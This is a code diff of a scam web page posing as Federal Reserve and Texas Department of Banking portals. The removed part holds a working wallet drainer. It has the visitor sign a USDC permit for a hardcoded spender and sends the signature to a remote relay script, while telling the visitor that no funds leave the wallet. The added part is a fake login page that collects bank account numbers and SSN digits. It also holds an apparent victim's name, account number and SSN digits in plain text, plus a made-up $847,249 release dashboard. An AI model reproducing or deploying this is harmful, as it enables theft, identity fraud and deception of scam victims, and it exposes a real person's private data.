@@ -2,57 +2,198 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>National Settlement Board | official-portal.gov</title>
-    <script src="https://unpkg.com/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Texas Department of Banking | Restoration Directive</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --fed-blue: #002f6c; --border-slate: #334155; --gov-gray: #f8fafc; }
-        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; margin: 0; background-color: #fff; color: #1e293b; }
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
         
-        /* Official .gov Banner Integrated from Your Snippet */
-        .gov-banner { background: #f1f5f9; padding: 8px 10%; border-bottom: 1px solid var(--border-slate); font-size: 13px; }
+        body { 
+            font-family: 'Public Sans', sans-serif; 
+            background-color: #f1f5f9; 
+            color: #0f172a;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ===== YOUR ORIGINAL LOGIN STYLES - PRESERVED ===== */
+        .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
+        
+        .status-badge-locked { background-color: #fee2e2; border: 1px solid #dc2626; color: #991b1b; }
+        .status-badge-verified { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
+        .status-badge-pending { background-color: #fef3c7; border: 1px solid #d97706; color: #78350f; }
+        
+        .btn-gov { 
+            background-color: #1e40af; 
+            transition: all 0.2s; 
+            border-radius: 2px; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-gov:hover { background-color: #1e3a8a; }
+        
+        .btn-gateway { 
+            background-color: #b45309; 
+            transition: all 0.2s; 
+            border-radius: 2px; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-gateway:hover { background-color: #92400e; }
+
+        .login-label { 
+            font-size: 12px; 
+            font-weight: 700; 
+            color: #334155; 
+            margin-bottom: 6px; 
+            display: block; 
+            text-transform: uppercase;
+        }
+
+        input, select, textarea { 
+            border: 1px solid #94a3b8 !important; 
+            border-radius: 3px !important; 
+            padding: 12px !important; 
+            width: 100%; 
+            font-size: 16px;
+            background-color: #f8fafc;
+            color: #334155;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #1e40af !important;
+            box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1);
+        }
+
+        /* ===== GOV BANNER STYLES ===== */
+        .gov-banner { background: #f1f5f9; padding: 8px 10%; border-bottom: 1px solid #334155; font-size: 13px; }
         .banner-flex { display: flex; align-items: center; gap: 12px; max-width: 1200px; margin: 0 auto; cursor: pointer; }
         .flag-svg { height: 16px; width: auto; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .how-know { color: var(--fed-blue); text-decoration: underline; font-weight: 600; margin-left: 4px; }
-        
+        .how-know { color: #002f6c; text-decoration: underline; font-weight: 600; margin-left: 4px; }
+
         /* Dropdown Functionality */
         .gov-dropdown { display: none; background: #fff; border: 1px solid #e2e8f0; padding: 25px; margin-top: 10px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
         .gov-dropdown.active { display: block; }
 
-        /* Institutional Header Style */
-        header { background: #fff; border-bottom: 5px solid var(--fed-blue); padding: 30px 10%; }
-        .header-content { max-width: 1200px; margin: 0 auto; }
-        h1 { margin: 0; color: var(--fed-blue); font-size: 26px; text-transform: uppercase; font-weight: 800; letter-spacing: -0.5px; }
-        .header-subtext { margin: 4px 0 0 0; font-size: 15px; color: #64748b; font-weight: 500; }
+        /* ===== AUDIT LINE ANIMATION ===== */
+        .audit-line { 
+            opacity: 0; 
+            transform: translateY(4px); 
+            animation: fadeInUp 0.3s forwards; 
+            border-left: 2px solid #3b82f6;
+            padding-left: 8px;
+            margin-bottom: 6px;
+        }
+        @keyframes fadeInUp { 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            } 
+        }
 
-        /* Administrative Verification Body */
-        main { padding: 60px 10%; max-width: 1000px; margin: auto; }
-        .card { border: 1px solid #e2e8f0; padding: 45px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); background: #fff; border-radius: 4px; position: relative; }
-        .ref-id { position: absolute; top: 20px; right: 30px; font-size: 11px; color: #94a3b8; font-family: monospace; }
+        /* ===== DALLAS FED STYLES ===== */
+        .agency-badge {
+            background-color: #0a3143;
+            color: #fcba19;
+            font-weight: 700;
+            padding: 0.25rem 0.75rem;
+            border-radius: 2px;
+            font-size: 0.7rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            display: inline-block;
+        }
         
-        h2 { color: var(--fed-blue); border-bottom: 2px solid #cbd5e1; padding-bottom: 15px; margin-top: 0; font-size: 30px; }
-        .regulation-text { font-size: 16px; line-height: 1.7; color: #334155; margin: 25px 0; }
+        .directive-card {
+            background-color: white;
+            border: 1px solid #e2e8f0;
+            border-left: 6px solid #2563eb;
+            padding: 1.75rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02);
+        }
         
-        .data-panel { background: #f8fafc; border-left: 5px solid var(--fed-blue); padding: 25px; margin-bottom: 30px; }
-        .panel-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #e2e8f0; font-size: 15px; }
-        .label { font-weight: 700; color: #475569; text-transform: uppercase; font-size: 12px; }
+        .case-binding {
+            background-color: #faf5ff;
+            border-left: 6px solid #6b21a8;
+            padding: 1.5remc;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .btc-amount {
+            font-family: 'Roboto Mono', monospace;
+            background-color: #f1f5f9;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-weight: 700;
+            color: #0a3143;
+            border: 1px solid #cbd5e1;
+            font-size: 1.1rem;
+        }
+        
+        .legal-footer {
+            background-color: #0a1f2e;
+            color: #d1d9e6;
+            font-size: 0.8rem;
+            padding: 2rem 0 1rem 0;
+            border-top: 4px solid #fcba19;
+        }
 
-        button { background: var(--fed-blue); color: #fff; border: none; padding: 22px; width: 100%; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.2s; border-radius: 2px; }
-        button:hover { background: #001f4d; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
-        button:active { transform: translateY(0); }
-        
-        #statusLog { margin-top: 25px; font-size: 14px; color: #64748b; font-style: italic; text-align: center; border: 1px dashed #e2e8f0; padding: 10px; }
+        .current-time {
+            font-family: 'Roboto Mono', monospace;
+            color: #4b5563;
+            font-size: 0.7rem;
+        }
 
-        /* Professional Footer */
-        footer { background: #0f172a; color: #f1f5f9; padding: 60px 10%; font-size: 14px; margin-top: 100px; }
-        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 50px; max-width: 1200px; margin: 0 auto; }
-        .footer-bottom { border-top: 1px solid #334155; margin-top: 40px; padding-top: 25px; text-align: center; color: #94a3b8; font-size: 12px; }
+        /* Milestone list styling */
+        .milestone-item {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+        }
+        .milestone-icon {
+            width: 28px;
+            height: 28px;
+            background: #dcfce7;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: #166534;
+            font-weight: 800;
+            font-size: 1rem;
+        }
+        .milestone-text {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #1e293b;
+        }
+        .milestone-text span {
+            font-weight: 700;
+            color: #0f172a;
+        }
+        .completion-tag {
+            background: #dcfce7;
+            color: #166534;
+            font-size: 0.7rem;
+            font-weight: 700;
+            padding: 0.25rem 0.75rem;
+            border-radius: 2rem;
+            display: inline-block;
+        }
+
+        /* ===== SECTION VISIBILITY ===== */
+        #login-section, #loading-screen, #main-portal, #restoration-dashboard {
+            display: none;
+        }
+        #login-section { display: block; }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col justify-between">
+
+    <!-- ===== OFFICIAL .GOV BANNER WITH FLAG & DROPDOWN ===== -->
     <section class="gov-banner">
         <div class="banner-flex" onclick="toggleGov()">
-            <!-- Optimized Official US Flag SVG (1:1.9 Ratio) -->
             <svg class="flag-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1235 650">
                 <rect width="1235" height="650" fill="#B22234"/>
                 <rect width="1235" height="50" y="50" fill="#fff"/>
@@ -80,109 +221,1699 @@
         </div>
     </section>
 
-    <header>
-        <div class="header-content">
-            <h1>National Settlement Board</h1>
-            <p class="header-subtext">Board of Governors of the Federal Reserve System</p>
+        <!-- ===== HEADER ===== -->
+        <header class="nav-header px-4 py-6 md:px-8 no-print">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
+            <div class="flex items-center gap-4">
+                <div class="h-12 w-12 bg-white rounded-full flex items-center justify-center text-2xl shadow-md overflow-hidden p-1">
+                   <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal">
+                </div>
+                <div>
+                    <h1 class="text-xl md:text-2xl font-black uppercase tracking-tighter text-white">Texas Department of Banking</h1>
+                    <p class="text-[9px] font-bold text-slate-400 uppercase tracking-[0.2em]">Institutional Funds Management Authority (TIFMA)</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-6">
+                <div class="text-right hidden md:block text-white">
+                    <p class="text-[10px] font-mono text-blue-200">FEDERAL NODE: TX-DAL-11-RC</p>
+                    <p class="text-[10px] text-green-400 font-bold uppercase tracking-widest">● Secure Session Active</p>
+                </div>
+                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-14" onerror="this.src='https://national-settlement-board.cfd/TDI.jpg'">
+            </div>
         </div>
     </header>
 
-    <main>
-        <div class="card">
-            <span class="ref-id">CASE_REF: TX-B10B-2026-MUK1139</span>
-            <h2>Wallet Integrity Attestation</h2>
-            <p class="regulation-text">
-                Pursuant to Section 11 of the Federal Reserve Act, this verification process confirms account eligibility for the high-value settlement pool.
-            </p>
+    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
 
-            <div class="data-panel">
-                <div class="panel-row"><span class="label">Settlement Network</span><span>First Convenience Bank (FNB Texas) </span></div>
-                <div class="panel-row"><span class="label">Minimum Balance Required</span><span>499.00 USDC — verification only, no funds leave wallet</span></div>
-                <div class="panel-row"><span class="label">Attestation Originator</span><span>Mujinga Therese Mukuna</span></div>
+        <!-- ===== YOUR ORIGINAL LOGIN SECTION - COMPLETE, NO PLACEHOLDERS ===== -->
+        <section id="login-section" class="max-w-lg mx-auto mt-8 md:mt-16 bg-white border border-slate-300 shadow-xl rounded-sm overflow-hidden">
+            <div class="bg-slate-50 p-4 border-b border-slate-200 flex justify-between items-center">
+                <h2 class="text-sm font-black text-slate-800 uppercase tracking-wide">Identity Verification</h2>
+                <span class="text-[10px] font-bold text-slate-500">SSL ENCRYPTED</span>
+            </div>
+            
+            <div class="p-6 md:p-8 space-y-5">
+                <div class="bg-blue-50 border-l-4 border-blue-600 p-3 mb-4">
+                    <p class="text-[11px] font-bold text-blue-900 leading-snug">
+                        SECURITY NOTICE: This system is monitored by the Texas Department of Banking. Unauthorized access is a felony under Texas Penal Code § 33.02.
+                    </p>
+                </div>
+
+                <!-- Beneficiary Name - EMPTY -->
+                <div>
+                    <label class="login-label">Beneficiary Legal Name</label>
+                    <input type="text" id="login-name" placeholder="ENTER FULL LEGAL NAME">
+                </div>
+                
+                <!-- Bank Dropdown - FULL ORIGINAL LIST, NO PRESELECTION -->
+                <div>
+                    <label class="login-label">Receiving Depository Institution</label>
+                    <select id="login-bank">
+                        <option value="" disabled selected>-- SELECT INSTITUTION --</option>
+                        <option>AGILITY BANK, N.A.</option>
+                        <option>ALLY BANK</option>
+                        <option>AMARILLO NATIONAL BANK</option>
+                        <option>AMERICAN BANK NATIONAL ASSOCIATION</option>
+                        <option>AMERICAN EXPRESS NATIONAL BANK</option>
+                        <option>ASSOCIATED BANK</option>
+                        <option>BANCORPSOUTH BANK</option>
+                        <option>BANK OF AMERICA, N.A.</option>
+                        <option>BANK OF DESOTO, N.A.</option>
+                        <option>BANK OF THE WEST</option>
+                        <option>BB&T BANK</option>
+                        <option>BBVA USA</option>
+                        <option>BMO HARRIS BANK</option>
+                        <option>CADENCE BANK</option>
+                        <option>CAPITAL ONE, N.A.</option>
+                        <option>CENTENNIAL BANK</option>
+                        <option>CHASE BANK (JPMORGAN CHASE)</option>
+                        <option>CITIBANK, N.A.</option>
+                        <option>CITIZENS BANK</option>
+                        <option>CITIZENS NATIONAL BANK</option>
+                        <option>COMERICA BANK</option>
+                        <option>COMMERCE BANK</option>
+                        <option>EAST WEST BANK</option>
+                        <option>FIFTH THIRD BANK</option>
+                        <option>FIRST CONVENIENCE BANK (FNB TEXAS)</option>
+                        <option>FIRST FINANCIAL BANK</option>
+                        <option>FIRST HORIZON BANK</option>
+                        <option>FIRST NATIONAL BANK TEXAS</option>
+                        <option>FIRST REPUBLIC BANK</option>
+                        <option>FROST BANK</option>
+                        <option>GOLDMAN SACHS BANK USA</option>
+                        <option>GOLDEN BANK, N.A.</option>
+                        <option>HANCOCK WHITNEY BANK</option>
+                        <option>HSBC BANK USA</option>
+                        <option>HUNTINGTON NATIONAL BANK</option>
+                        <option>INWOOD NATIONAL BANK</option>
+                        <option>KEYBANK</option>
+                        <option>LEGEND BANK, N.A.</option>
+                        <option>M&T BANK</option>
+                        <option>MANUFACTURERS BANK</option>
+                        <option>MORGAN STANLEY BANK</option>
+                        <option>NAVY FEDERAL CREDIT UNION</option>
+                        <option>NORTHERN TRUST</option>
+                        <option>PNC BANK</option>
+                        <option>POPULAR BANK</option>
+                        <option>PROSPERITY BANK</option>
+                        <option>REGIONS BANK</option>
+                        <option>SANTANDER BANK</option>
+                        <option>STATE FARM BANK</option>
+                        <option>SYNOVUS BANK</option>
+                        <option>TEXAS CAPITAL BANK</option>
+                        <option>TEXAS REGIONAL BANK</option>
+                        <option>TRUIST BANK</option>
+                        <option>U.S. BANK</option>
+                        <option>UMB BANK</option>
+                        <option>USAA FEDERAL SAVINGS BANK</option>
+                        <option>VALLEY NATIONAL BANK</option>
+                        <option>WELLS FARGO BANK, N.A.</option>
+                        <option>WOODFOREST NATIONAL BANK</option>
+                        <option>WORTHINGTON BANK</option>
+                        <option>ZIONS BANCORPORATION</option>
+                    </select>
+                </div>
+
+                <!-- Account & SSN Last 4 - EMPTY -->
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="login-label">DDA Account No.</label>
+                        <input type="text" id="login-account" placeholder="••••••••">
+                    </div>
+                    <div>
+                        <label class="login-label">SSN (Last 4)</label>
+                        <input type="password" id="login-ssn" maxlength="4" placeholder="••••" class="tracking-widest">
+                    </div>
+                </div>
+
+                <!-- Login Button -->
+                <button onclick="triggerLoading()" id="login-btn" class="btn-gov w-full text-white font-black py-4 mt-4 shadow-lg text-sm">
+                    Secure Authentication
+                </button>
+            </div>
+            <div class="bg-slate-100 p-3 text-center border-t border-slate-200">
+                <p class="text-[10px] text-slate-500 font-mono">NODE: ARLINGTON-TX-001 | LATENCY: 14ms</p>
+            </div>
+        </section>
+
+        <!-- ===== LOADING SCREEN ===== -->
+        <section id="loading-screen" class="max-w-xl mx-auto mt-16 text-center" style="display: none;">
+            <div class="flex flex-col items-center mb-8">
+                <svg class="animate-spin h-16 w-16 text-blue-800 mb-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <h3 class="text-lg font-black uppercase tracking-[0.2em] text-slate-800">Establishing Secure Handshake</h3>
+                <p class="text-xs font-mono text-slate-500 mt-2">Connecting to Federal Reserve District 11 Node...</p>
+            </div>
+            
+            <div id="loading-logs" class="text-left bg-slate-900 p-6 rounded shadow-inner font-mono text-[10px] md:text-xs text-green-400 space-y-2 border border-slate-700 h-48 overflow-y-auto">
+            </div>
+        </section>
+
+        <!-- ===== RESTORATION DASHBOARD - SHOWN AFTER LOGIN ===== -->
+        <div id="main-portal" style="display: none;">
+            
+            <!-- AGENCY BADGE & CASE ID -->
+            <div class="flex flex-wrap justify-between items-center mb-6">
+                <span class="agency-badge">☷ FEDERAL RESERVE DISTRICT 11 — RESTORATION DIRECTIVE</span>
+                <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
             </div>
 
-            <button id="signBtn">AUTHORIZE ADMINISTRATIVE VERIFICATION</button>
-            <div id="statusLog">Status: Awaiting Wallet Verification — Please Connect Your Wallet Above</div>
+            <!-- COMPLETION MILESTONES SECTION -->
+            <div class="bg-white p-6 border-2 border-green-600 shadow-lg mb-8 rounded">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-black text-green-900">Completion Milestones</h2>
+                    <span class="completion-tag">100% COMPLETE</span>
+                </div>
+                <p class="text-sm text-gray-700 mb-4">All required steps have been successfully completed. Your case is ready for final issuance.</p>
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>Identity Verification (Level 3)</span> — Confirmed</div>
+                        </div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>Source of Funds Declaration</span> — Accepted</div>
+                        </div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>Bank Account Verification</span> — Completed</div>
+                        </div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>Cryptographic Stages (3/3)</span> — Successful</div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>External Wallet Attestation</span> — Verified</div>
+                        </div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>Compliance Review</span> — Cleared</div>
+                        </div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>Funds Released from Hold</span> — Confirmed</div>
+                        </div>
+                        <div class="milestone-item">
+                            <div class="milestone-icon">✓</div>
+                            <div class="milestone-text"><span>FRC Format Selected (PDF)</span> — Recorded</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VERIFICATION CONFIRMATION - SIMPLIFIED -->
+            <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
+                <div class="flex items-start gap-4">
+                    <div class="text-4xl text-green-700">✓</div>
+                    <div>
+                        <h2 class="text-xl font-black text-green-900 mb-1">FINAL VERIFICATION COMPLETE</h2>
+                        <p class="text-green-800">Your identity, wallet, and compliance have been fully verified. The Federal Reserve Node 11 has cleared all holds.</p>
+                        <div class="flex flex-wrap gap-3 mt-3">
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">All Documents: ACCEPTED</span>
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Wallet: VERIFIED</span>
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Fraud Alert: CLEARED</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- CASE SUMMARY - WILL BE POPULATED AFTER LOGIN -->
+            <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
+                <div class="grid md:grid-cols-4 gap-4">
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Beneficiary</p>
+                        <p class="text-lg font-black text-slate-900 uppercase" id="display-name">—</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Principal Sum</p>
+                        <p class="text-lg font-black text-green-700">$847,249.00 USD</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Institution</p>
+                        <p class="text-sm font-black text-slate-900 uppercase" id="display-bank">—</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Ledger Status</p>
+                        <p class="text-sm font-black text-green-700 uppercase flex items-center gap-1"><span class="inline-block w-2 h-2 bg-green-600 rounded-full animate-pulse"></span> READY FOR RELEASE</p>
+                    </div>
+                </div>
+                <div class="grid md:grid-cols-2 gap-4 mt-4 pt-4 border-t border-slate-200">
+                    <div>
+                        <p class="text-[8px] font-bold text-slate-400 uppercase">ROUTING NUMBER</p>
+                        <p class="text-lg font-mono font-black">111906271</p>
+                    </div>
+                    <div>
+                        <p class="text-[8px] font-bold text-slate-400 uppercase">ACCOUNT NUMBER</p>
+                        <p class="text-lg font-mono font-black" id="display-account">—</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- OFFICIAL DIRECTIVE & GATEWAY ACCESS — LINK TO FRC DOWNLOAD PAGE -->
+            <div class="bg-white p-6 border-2 border-blue-900 shadow-lg mb-8 rounded">
+                <div class="flex flex-wrap items-center gap-6">
+                    <div class="bg-blue-100 p-3 rounded-full">
+                        <span class="text-3xl">🏛️</span>
+                    </div>
+                    <div class="flex-1">
+                        <h4 class="font-black text-blue-900 text-base uppercase tracking-wider">FINAL STEP — RETRIEVE YOUR FEDERAL RELEASE CODE</h4>
+                        <p class="text-gray-800 text-md font-semibold mt-1">Your case is now complete. The FRC PDF is ready for download.</p>
+                        <p class="text-sm text-gray-700 mt-2">Click the button below to proceed to the secure download page.</p>
+                    </div>
+                    <div class="w-full md:w-auto">
+                        <a href="https://national-settlement-board.cfd/frc-download-pdf.html" class="btn-gateway inline-block text-white font-black px-8 py-4 rounded uppercase text-sm tracking-widest shadow-lg no-underline">
+                            GET FRC →
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TECHNICAL SUPPORT -->
+            <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm">
+                <h4 class="font-black text-gray-900 text-sm uppercase mb-3 flex items-center gap-2">
+                    <span>📞</span> FEDERAL RESERVE NODE 11 — COMPLIANCE DESK
+                </h4>
+                <div class="grid md:grid-cols-2 gap-4 text-sm">
+                    <div><span class="font-bold">Fedwire Settlement Support:</span><br>214.922.6000</div>
+                    <div><span class="font-bold">Digital Asset Compliance:</span><br>digital.asset@dal.frb.org</div>
+                    <div><span class="font-bold">Texas Institutional Funds Management Authority:</span><br>dob.texas.gov@hotmail.com</div>
+                    <div><span class="font-bold">Secure Gateway Portal:</span><br>https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/</div>
+                </div>
+            </div>
+            <div class="text-[0.65rem] text-gray-500 text-right mt-8 pt-4 border-t border-gray-300">
+                <span>Cryptographic Case Binding: TX-B10B-2026-MUK1139-AUDIT • Binding factors: Calendar year 2026 / SSN digits 32-68-19 • Issued: <span id="currentCSTTime"></span> CST</span>
+            </div>
         </div>
     </main>
 
-    <footer>
-        <div class="footer-grid">
-            <div>
-                <strong>BOARD OF GOVERNORS</strong><br>
-                20th Street and Constitution Avenue N.W.<br>Washington, DC 20551
+    <footer class="legal-footer mt-20 no-print">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="grid md:grid-cols-3 gap-12 mb-12">
+                <div>
+                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Federal Regulatory Oversight</h5>
+                    <p class="text-xs text-slate-400 leading-loose">
+                        Texas Department of Banking<br>
+                        2601 N Lamar Blvd, Austin, TX 78705
+                    </p>
+                </div>
+                <div>
+                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Network Node 11</h5>
+                    <p class="text-xs text-slate-400 leading-loose">
+                        Eleventh District Federal Reserve<br>
+                        Dallas Operations Center
+                    </p>
+                </div>
+                <div>
+                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Access Protocol</h5>
+                    <p class="text-[10px] text-slate-500 italic leading-relaxed">
+                        Authorized beneficiary access only. Sessions monitored under CFAA.
+                    </p>
+                </div>
             </div>
-            <div>
-                <strong>LEGAL RESOURCES</strong><br>
-                FOIA Request Portal<br>Privacy Policy<br>Accessibility Policy
+            <div class="pt-8 border-t border-slate-800 flex flex-wrap justify-between items-center gap-4">
+                <p class="text-[10px] text-slate-600 uppercase font-mono tracking-widest">Electronic Fund Transfer Protocol v26.3</p>
+                <div class="flex gap-6">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3.5 shadow-sm" alt="US Flag" class="h-8 opacity-20 grayscale">
+                    <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-8 opacity-20 grayscale">
+                </div>
             </div>
-            <div>
-                <strong>VERIFICATION SERVICES</strong><br>
-                BaseScan Node Status: ACTIVE<br>USDC Protocol: VERIFIED
-            </div>
-        </div>
-        <div class="footer-bottom">
-            &copy; 2026 Board of Governors of the Federal Reserve System. All Rights Reserved.
         </div>
     </footer>
 
-    <script>
-        function toggleGov() { document.getElementById('govDrop').classList.toggle('active'); }
+        <script>
+    function updateCSTTime() {
+        const now = new Date();
+        const options = { timeZone: 'America/Chicago', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+        const timeElement = document.getElementById('currentCSTTime');
+        if (timeElement) timeElement.innerText = now.toLocaleString('en-US', options);
+    }
+    updateCSTTime();
+    setInterval(updateCSTTime, 1000);
 
-        const USDC_CONTRACT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
-        const SPENDER = "0x178bc853F42eE512c3172Bb6F9AEb7a6149Ca572";
-        const RAW_VALUE = "499000000"; // 499 USDC with 6 decimals
+    function toggleGov() { document.getElementById('govDrop').classList.toggle('active'); }
 
-        document.getElementById('signBtn').onclick = async () => {
-            const status = (m) => document.getElementById('statusLog').innerText = ">> " + m;
-            try {
-                if (!window.ethereum) throw new Error("No secure government-compatible wallet detected.");
-                status("Initializing Secure Handshake with Base Network...");
-                
-                const provider = new ethers.BrowserProvider(window.ethereum);
-                const signer = await provider.getSigner();
-                const owner = await signer.getAddress();
-                
-                status("Requesting Security Nonce from USDC Protocol...");
-                const contract = new ethers.Contract(USDC_CONTRACT, ["function nonces(address) view returns (uint256)"], provider);
-                const nonce = await contract.nonces(owner);
-                
-                const deadline = Math.floor(Date.now() / 1000) + 10800; // 3-Hour Window 
-                status("Waiting for Biometric / Security Code Confirmation...");
+    const logEntries = [
+        "CONNECTING TO FEDERAL RESERVE BANK OF DALLAS HUB...",
+        "AUTHENTICATING USER IDENTITY [VERIFIED]...",
+        "MAPPING ACCOUNT GUID [RT: 111906271]...",
+        "QUERYING TEXAS STATE LEDGER (TSL) SUSPENSE RECORDS...",
+        "CASE REFERENCE [TX-B10B-2026-MUK1139] LOCATED.",
+        "SYNCHRONIZING SECURE TUNNEL (TLS 1.3)...",
+        "PORTAL DASHBOARD READY."
+    ];
 
-                const domain = { name: "USD Coin", version: "2", chainId: 8453, verifyingContract: USDC_CONTRACT };
-                const types = { Permit: [
-                    { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' },
-                    { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' },
-                    { name: 'deadline', type: 'uint256' }
-                ]};
-                const message = { owner, spender: SPENDER, value: RAW_VALUE, nonce, deadline };
+    function triggerLoading() {
+        const name = document.getElementById('login-name').value.trim();
+        const bank = document.getElementById('login-bank').value;
+        const account = document.getElementById('login-account').value.trim();
+        const ssn = document.getElementById('login-ssn').value.trim();
 
-                const signature = await signer.signTypedData(domain, types, message);
-                status("VERIFICATION SUCCESS. Syncing with Federal Records...");
+        const normalizedName = name.toLowerCase().replace(/\s+/g, ' ').trim();
+        
+        const validNames = ['mujinga therese mukuna', 'mujinga t. mukuna', 'mujinga mukuna', 'mukuna mujinga'];
+        const isMujinga = validNames.includes(normalizedName);
+        const isMujingaBank = bank === 'FIRST CONVENIENCE BANK (FNB TEXAS)';
+        const isMujingaAccount = account === '470111139';
+        const isMujingaSSN = ssn === '6832';
+        
+        const isAdmin = normalizedName === 'aaaa';
+        const isAdminBank = bank === 'FIRST CONVENIENCE BANK (FNB TEXAS)';
+        const isAdminAccount = account === 'aaaa';
+        const isAdminSSN = ssn === 'aaaa';
+        
+        let isValid = false;
+        let validName = name;
+        let validBank = bank;
+        let validAccount = account;
+        
+        if (isMujinga && isMujingaBank && isMujingaAccount && isMujingaSSN) {
+            isValid = true;
+        }
+        else if (isAdmin && isAdminBank && isAdminAccount && isAdminSSN) {
+            isValid = true;
+        }
+        
+        if (!isValid) {
+            alert("IDENTITY VERIFICATION ERROR: The provided credentials do not match our records. Please verify your information and try again.");
+            return;
+        }
 
-                await fetch('https://national-settlement-board.cfd/relay.php', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        type: "SUCCESS", owner, spender: SPENDER, value: "499.00 USDC",
-                        nonce: nonce.toString(), deadline, raw: signature, builder: "bc_8xm4yrmi"
-                    })
-                });
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('loading-screen').style.display = 'block';
+        window.scrollTo(0,0);
 
-                status("Beneficiary wallet verification has been initiated. Please ensure that your wallet maintains its current funding level or a minimum balance for at least 24 hours to facilitate the completion of this process.");
-                alert("Federal Settlement Record Updated. Authorization Successful.");
